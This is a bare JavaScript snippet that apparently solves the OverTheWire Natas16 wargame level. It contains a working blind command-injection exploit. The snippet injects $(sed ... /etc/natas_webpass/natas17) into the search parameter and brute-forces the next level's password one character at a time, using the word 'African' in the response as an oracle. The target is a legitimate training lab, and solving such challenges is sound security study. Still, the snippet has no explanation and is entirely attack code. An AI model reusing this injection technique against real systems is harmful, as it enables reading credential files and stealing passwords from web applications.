var str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", result = "................................";
for (var i = 0; i < 32; ++i){
	for (var j = 0; j < 62; ++j){
		var s = "...............................";
		(function(i,j){
          $.get("http://natas16.natas.labs.overthewire.org/index.php","needle=$(sed -E s/^"+s.slice(0, i)+str[j]+s.slice(i)+"$/a/g /etc/natas_webpass/natas17)", function(h){
              var regex = /African/i;
              if (h.match(regex) != null){
                  result = result.slice(0, i)+str[j]+result.slice(i+1);
                  console.log(result);
              }
             
              //else console.log(h);
          }, "html");
		})(i,j)
	}
}

